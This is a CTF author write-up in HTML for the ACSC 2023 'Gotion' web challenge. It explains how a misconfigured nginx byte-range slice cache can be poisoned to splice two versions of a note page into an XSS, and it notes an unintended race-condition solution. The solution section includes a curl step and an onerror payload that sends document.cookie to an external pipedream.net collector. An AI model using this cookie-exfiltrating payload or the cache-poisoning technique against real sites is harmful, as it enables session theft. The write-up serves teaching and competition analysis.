<!doctype html><html lang=en-us><head><meta charset=utf-8><link crossorigin=anonymous media=all rel=stylesheet href=https://blog.tyage.net/css/frameworks.css><link crossorigin=anonymous media=all rel=stylesheet href=https://blog.tyage.net/css/github.css><meta name=viewport content="width=device-width"><meta name=description content="I made a Gotion Challenge in ACSC (Asian Cyber Security Challenge) 2023.
This is a byte-range cache poisoning XSS challenge.
Challenge Description:
Gotion is yet another simple secure note service. You might have seen these kind of applications many times before, but try this one! Challenge Repository: https://github.com/tyage/acsc2023-gotion
In ACSC 2023, I made a Gotion challenge and promotion video :) Thank you everyone who played! pic.twitter.com/SN4PXKkKid
&amp;mdash; もうダニ by 左京区在中 (@tyage) February 26, 2023  Challenge Details The challenge has three components: Go web application, nginx and bot."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/><meta name=twitter:card content="summary"><meta name=twitter:title content="ACSC 2023 Gotion Challenge Author Writeup - blog.tyage.net"><meta name=twitter:description content="I made a Gotion Challenge in ACSC (Asian Cyber Security Challenge) 2023.
This is a byte-range cache poisoning XSS challenge.
Challenge Description:
Gotion is yet another simple secure note service. You might have seen these kind of applications many times before, but try this one! Challenge Repository: https://github.com/tyage/acsc2023-gotion
In ACSC 2023, I made a Gotion challenge and promotion video :) Thank you everyone who played! pic.twitter.com/SN4PXKkKid
&amp;mdash; もうダニ by 左京区在中 (@tyage) February 26, 2023  Challenge Details The challenge has three components: Go web application, nginx and bot."><meta name=twitter:site content="https://blog.tyage.net/"><meta name=twitter:creator content><meta name=twitter:image content="https://blog.tyage.net/"><meta property="og:type" content="article"><meta property="og:title" content="ACSC 2023 Gotion Challenge Author Writeup - blog.tyage.net"><meta property="og:description" content="I made a Gotion Challenge in ACSC (Asian Cyber Security Challenge) 2023.
This is a byte-range cache poisoning XSS challenge.
Challenge Description:
Gotion is yet another simple secure note service. You might have seen these kind of applications many times before, but try this one! Challenge Repository: https://github.com/tyage/acsc2023-gotion
In ACSC 2023, I made a Gotion challenge and promotion video :) Thank you everyone who played! pic.twitter.com/SN4PXKkKid
&amp;mdash; もうダニ by 左京区在中 (@tyage) February 26, 2023  Challenge Details The challenge has three components: Go web application, nginx and bot."><meta property="og:url" content="https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/"><meta property="og:site_name" content="ACSC 2023 Gotion Challenge Author Writeup"><meta property="og:image" content="https://blog.tyage.net/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2023-03-12 00:00:00 +0900 +0900"><title>ACSC 2023 Gotion Challenge Author Writeup - blog.tyage.net</title><link rel=icon type=image/x-icon class=js-site-favicon href=https://blog.tyage.net/images/favicon.ico><meta name=theme-color content="#1e2327"><script>const match=location.search.match(/^\?p=(\d+)$/)
if(location.pathname==='/'&&match!==null){const postId=match[1]
history.replaceState({previousUrl:location.href},'',`/p${postId}/`)
location.reload()}else{if(history.state!==null&&history.state.previousUrl){history.replaceState({},'',history.state.previousUrl)}}</script><style>.blog-post p{line-height:1.8}</style><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin=anonymous></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-3879973-3','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class="env-production emoji-size-boost page-responsive page-profile"><div class="position-relative js-header-wrapper"><span class="Progress progress-pjax-loader position-fixed width-full js-pjax-loader-bar"><span class="progress-pjax-loader-bar top-0 left-0" style=width:0%></span></span><header class="Header py-lg-0 js-details-container Details flex-wrap flex-lg-nowrap p-responsive" role=banner><div class="Header-item d-none d-lg-flex"><a class=Header-link href=https://blog.tyage.net/ aria-label=Homepage data-ga-click="Header, go to dashboard, icon:logo"><svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z" /></svg></a></div><div class="Header-item Header-item--full flex-column flex-lg-row width-full flex-order-2 flex-lg-order-none mr-0 mr-lg-3 mt-3 mt-lg-0 Details-content--hidden"><div class="header-search flex-self-stretch flex-lg-self-auto mr-0 mr-lg-3 mb-3 mb-lg-0 scoped-search site-scoped-search js-site-search position-relative js-jump-to" role=combobox aria-owns=jump-to-results aria-label="Search or jump to" aria-haspopup=listbox aria-expanded=false><div class=position-relative></div></div></div><nav class=d-flex aria-label=Global><a class="js-selected-navigation-item Header-link py-lg-3">&nbsp;</a></nav><div class="Header-item Header-item--full flex-justify-center d-lg-none position-relative" style=margin-right:auto><a class=Header-link href=https://blog.tyage.net/ aria-label=Homepage data-ga-click="Header, go to dashboard, icon:logo"><svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z" /></svg></a></div><div class="Header-item position-relative mr-0 d-none d-lg-flex"><details class="details-overlay details-reset"><summary class=Header-link aria-label="View profile and more" data-ga-click="Header, show menu, icon:avatar"><img alt class=avatar src=/icon/icon.jpg height=20 width=20></summary></details></div></header></div><div id=start-of-content class=show-on-focus></div><div id=js-flash-container></div><div class=application-main data-commit-hovercards-enabled><div itemscope itemtype=http://schema.org/SoftwareSourceCode><main><div class="pagehead repohead instapaper_ignore readability-menu experiment-repo-nav pt-0 pt-lg-4"><div class="repohead-details-container clearfix container-lg p-responsive d-none d-lg-block"><div class="mb-3 d-flex"><h1 class="public css-truncate float-none flex-auto width-fit pl-0"><a class="avatar mr-1" href=https://blog.tyage.net/about/><img src=/icon/icon.jpg width=26 height=26></a>
<span class=author><a href=https://blog.tyage.net/>tyage</a></span>
<span class=path-divider>/</span>
<strong itemprop=name class=css-truncate-target style=max-width:410px><a href=https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/>ACSC 2023 Gotion Challenge Author Writeup</a></strong><div class="d-block text-small text-gray">Created <time-ago datetime=2023-03-12 class=no-wrap title="Created at 2023/03/12">2023-03-12</time-ago>
<span class=file-info-divider></span>Modified <time-ago datetime=2023-03-12 class=no-wrap title="Modified  at 2023/03/12">2023-03-12</time-ago></div></h1></div></div></div><div class="container-lg clearfix new-discussion-timeline experiment-repo-nav p-responsive"><div class=repository-content><div class="Box mt-3 position-relative"><div class="Box-header py-2 d-flex flex-column flex-shrink-0 flex-md-row flex-md-items-center"><div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">755 Words</div></div><div id=readme class="Box-body readme blob instapaper_body js-code-block-container"><article class="markdown-body entry-content p-3 p-md-6" itemprop=text><p>I made a Gotion Challenge in <a href=https://acsc.asia/>ACSC</a> (Asian Cyber Security Challenge) 2023.</p><p>This is a byte-range cache poisoning XSS challenge.</p><p>Challenge Description:</p><pre><code>Gotion is yet another simple secure note service. You might have seen these kind of applications many times before, but try this one!
</code></pre><p>Challenge Repository: <a href=https://github.com/tyage/acsc2023-gotion>https://github.com/tyage/acsc2023-gotion</a></p><blockquote class=twitter-tweet><p lang=en dir=ltr>In ACSC 2023, I made a Gotion challenge and promotion video :) Thank you everyone who played! <a href=https://t.co/SN4PXKkKid>pic.twitter.com/SN4PXKkKid</a></p>&mdash; もうダニ by 左京区在中 (@tyage) <a href="https://twitter.com/tyage/status/1629679515529281536?ref_src=twsrc%5Etfw">February 26, 2023</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><h1 id=challenge-details>Challenge Details</h1><p>The challenge has three components: Go web application, nginx and bot.
This is obviously an XSS challenge as the bot has FLAG in the cookie.</p><p>The Go app allows users to create simple note pages with only title and body.
The title &ldquo;Gotion&rdquo; is a parody of the famous note-taking app Notion and Go.</p><p>Users can enter title and body, but they are HTML escaped.
Therefore it is not possible to cause XSS in the notes page.</p><p>The key points here are that notes have their own unique URL and Gotion creates static HTML files for each note page like SSG (Static Site Generator).
Users can control the last part of the note URL, but they are only allowed to use restricted characters <code>[a-zA-Z0-9 ]</code>.</p><p>Looking inside nginx, the config file has a suspicious cache directive.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=color:#66d9ef>proxy_cache_path</span> <span style=color:#e6db74>/tmp/nginx</span> <span style=color:#e6db74>keys_zone=mycache:10m</span>;
<span style=color:#66d9ef>server</span> {
    <span style=color:#f92672>listen</span> <span style=color:#ae81ff>80</span>;

    <span style=color:#f92672>location</span> ~ <span style=color:#e6db74>.mp4$</span> {
        <span style=color:#75715e># Smart and Efficient Byte-Range Caching with NGINX
</span><span style=color:#75715e></span>        <span style=color:#75715e># https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/
</span><span style=color:#75715e></span>        <span style=color:#f92672>proxy_cache</span> <span style=color:#e6db74>mycache</span>;
        <span style=color:#f92672>slice</span>              <span style=color:#ae81ff>4096</span>; <span style=color:#75715e># Maybe it should be bigger?
</span><span style=color:#75715e></span>        <span style=color:#f92672>proxy_cache_key</span>    $host$uri$is_args$args$slice_range;
        <span style=color:#f92672>proxy_set_header</span>   <span style=color:#e6db74>Range</span> $slice_range;
        <span style=color:#f92672>proxy_http_version</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>.1</span>;
        <span style=color:#f92672>proxy_cache_valid</span>  <span style=color:#ae81ff>200</span> <span style=color:#ae81ff>206</span> <span style=color:#e6db74>1h</span>;
        <span style=color:#f92672>proxy_pass</span> <span style=color:#e6db74>http://app:3000</span>;
    }

    <span style=color:#f92672>location</span> <span style=color:#e6db74>/</span> {
        <span style=color:#f92672>proxy_pass</span> <span style=color:#e6db74>http://app:3000</span>;
    }
}
</code></pre></div><p>This directive caches an mp4 file, but it is not a normal cache, it is a <a href=https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/>byte-range cache</a> which allows us to cache part of the content.
When a client requests <code>Range: bytes=0-1000</code>, nginx requests the content with a <code>Range: bytes=0-4095</code> header to the origin server and caches the response.
If a client requests <code>Range: bytes=0-1000</code> again, nginx can respond quickly because there is a cache of the first 4096 bytes.</p><p>This config file also has an error in the location directive.
The <code>.</code> in <code>location ~ .mp4$</code> does not mean <code>.</code> but any character, because this is RegExp.
This directive was made for the video file <code>howto.mp4</code> but the file such as <code>FOOBARmp4</code> will unfortunately be cached.</p><h1 id=solution>Solution</h1><p>The solution is byte range cache poisoning, which causes nginx to return HTML containing XSS payload.</p><p>This is possible because nginx concatenates segmented caches.
Consider a situation where nginx has the content cache, but only the first 4096 bytes, and the content was updated later.
When a client makes a request without a range header, nginx will retrieve the rest of the updated content and concatenate it with the first cache.</p><p>In other words, we can concatenate the sliced parts of two different HTMLs!</p><p>The steps to exploit this into XSS are below.</p><ol><li><p>Create a note page whose URL ends with <code>AAAAAAAAAAAAAAAAAmp4</code> so that it will be cached.</p></li><li><p>Modify the HTML of the note so that the first 4096 bytes end with <code>&lt;</code>.</p></li></ol><p>The first 4096 bytes of HTML will look like this</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;

&lt;<span style=color:#f92672>head</span>&gt;
...
          &lt;<span style=color:#f92672>textarea</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;body&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;note&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;height: 300px;&#34;</span>&gt;AAAA...AAAAA<span style=color:#960050;background-color:#1e0010>&lt;</span>
</code></pre></div><ol start=3><li><p>Cache the first 4096 bytes with a range header <code>curl http://.../...AAAAAAAAAAAAAAAAAmp4 -H "Range: bytes=0-4095"</code>.</p></li><li><p>Update the page so that the second 4096 bytes block starts with <code>img src=x onerror=[payload here]</code>.</p></li></ol><p>The second block will look like this</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>img src=x onerror=location=`//eo7x31ojradre3r.m.pipedream.net/?c=${document.cookie}` x=&lt;/<span style=color:#f92672>textarea</span>&gt;
...
&lt;/<span style=color:#f92672>body</span>&gt;

&lt;/<span style=color:#f92672>html</span>&gt;
</code></pre></div><ol start=5><li><p>Report the URL <code>http://.../...AAAAAAAAAAAAAAAAAmp4</code></p></li><li><p>Wait for the flag and done!</p></li></ol><p>The full solution script is here <a href=https://github.com/tyage/acsc2023-gotion/blob/main/solution/solve.py>https://github.com/tyage/acsc2023-gotion/blob/main/solution/solve.py</a>.</p><h1 id=unintended-solution>Unintended Solution</h1><p>There is an unintended solution.
I forgot to write an exclusive lock when Go app write a HTML to file.</p><p><a href=https://github.com/tyage/acsc2023-gotion/blob/main/app/main.go#L117>https://github.com/tyage/acsc2023-gotion/blob/main/app/main.go#L117</a></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go>		<span style=color:#a6e22e>f</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>OpenFile</span>(<span style=color:#a6e22e>noteFilePath</span>, <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>O_WRONLY</span>|<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>O_TRUNC</span>, <span style=color:#ae81ff>0644</span>)
		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
			<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Error</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;invalid note&#34;</span>, <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusInternalServerError</span>)
			<span style=color:#66d9ef>return</span>
		}

		<span style=color:#a6e22e>WriteNote</span>(<span style=color:#a6e22e>f</span>, <span style=color:#a6e22e>NoteParam</span>{
			<span style=color:#a6e22e>Id</span>:    <span style=color:#a6e22e>noteId</span>,
			<span style=color:#a6e22e>URL</span>:   <span style=color:#a6e22e>noteURL</span>,
			<span style=color:#a6e22e>Title</span>: <span style=color:#a6e22e>title</span>,
			<span style=color:#a6e22e>Body</span>:  <span style=color:#a6e22e>body</span>,
		})
</code></pre></div><p>It causes race condition when the app process <code>WriteNote</code> at the same time and it was possible to store broken HTML causing XSS.</p><h1 id=comment>Comment</h1><p>To make a challenge solvable, origin HTTP server must support byte-range request and must <em>not</em> return E-Tag header.
Fortunately, Go net/http server meets these requirements therefore I chose the Go server.</p><p>Not only nginx but also some other HTTP cache servers and CDNs have this kind of implementation, so I think this concept has a chance to be exploited in a real environment.</p><p>I think this is the first PoC of byte-range cache poisoning XSS and I wish the participants have enjoyed the challenge!</p></article></div></div></div></div></main></div></div><div class="footer container-lg width-full p-responsive" role=contentinfo><div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light"><ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"><li class="mr-3 mr-lg-0"></a></li></ul><a aria-label=Homepage title=blog.tyage.net class="footer-octicon d-none d-lg-block mx-lg-4" href=https://blog.tyage.net/><svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a><ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"></ul></div><div class="d-flex flex-justify-center pb-6"><span class="f6 text-gray-light"></span></div></div><script crossorigin=anonymous type=application/javascript src=https://blog.tyage.net/js/frameworks.js></script><script crossorigin=anonymous type=application/javascript src=https://blog.tyage.net/js/github-bootstrap.js></script><script src=https://blog.tyage.net/js/stop.js></script><script src=https://blog.tyage.net/js/contributions.js></script></body></html>